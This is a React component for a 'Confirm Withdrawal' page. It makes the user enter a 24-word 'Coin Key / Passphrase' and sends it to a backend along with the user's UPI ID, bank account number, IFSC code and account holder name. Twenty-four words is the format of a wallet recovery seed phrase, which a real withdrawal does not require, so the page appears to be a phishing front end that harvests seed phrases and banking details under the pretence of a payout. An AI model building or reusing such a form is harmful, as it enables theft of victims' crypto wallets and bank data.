import { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import '../css/CoinKeyPage.css';

// Coin Key Page component
function CoinKeyPage({ quantity, totalAmount }) {
  const navigate = useNavigate();
  const { state } = useLocation();
  const [coinKey, setCoinKey] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // Validate 24 words
  const isValidCoinKey = (key) => {
    const words = key.trim().split(/\s+/);
    return words.length === 24;
  };

  // Handle form submission
  const handleSubmit = async () => {
    if (!isValidCoinKey(coinKey)) {
      setError('Coin Key must contain exactly 24 words');
      // Fallback to ensure alert works
      try {
        window.alert('Please enter a complete key with exactly 24 words');
      } catch (e) {
        console.error('Alert failed:', e);
        // Additional fallback: show error in console and UI
        setError('Please enter a complete key with exactly 24 words');
      }
      return;
    }

    setLoading(true);
    try {
      await axios.post('http://localhost:5000/api/submit-key', {
        quantity,
        totalAmount,
        method: state.method,
        upiId: state.upiId,
        accountNo: state.accountNo,
        ifsc: state.ifsc,
        accountHolder: state.accountHolder,
        coinKey,
        contactId: state.contactId,
        fundAccountId: state.fundAccountId,
        payoutId: state.payoutId,
      });
      navigate('/withdrawal-success', {
        state: { payoutId: state.payoutId, amount: totalAmount },
      });
    } catch (err) {
      const errorMessage = err.response?.data?.error || 'Failed to submit key';
      setError(errorMessage);
      try {
        window.alert('Failed to submit key. Please try again.');
      } catch (e) {
        console.error('Alert failed:', e);
        setError(errorMessage); // Fallback to UI error
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="app">
      <div className="app-container">
        <div className="coin-key-container">
          <h1 className="coin-key-title">Confirm Withdrawal</h1>
          <p className="coin-key-info">Quantity: {quantity} | Total Amount: ₹{totalAmount}</p>
          <p className="coin-key-info">Account Holder: {state.accountHolder}</p>
          <div className="input-group">
            <label className="input-label">Coin Key / Passphrase (24 words)</label>
            <textarea
              value={coinKey}
              onChange={(e) => setCoinKey(e.target.value)}
              className="coin-key-input"
              placeholder="Enter 24-word coin key"
              rows="6" // Initial visible rows
            />
          </div>
          {error && <p className="error-text">{error}</p>}
          <button
            onClick={handleSubmit}
            disabled={loading || !coinKey || !isValidCoinKey(coinKey)}
            className="confirm-button"
          >
            {loading ? 'Submitting...' : 'Confirm Withdraw'}
          </button>
        </div>
      </div>
    </div>
  );
}

export default CoinKeyPage;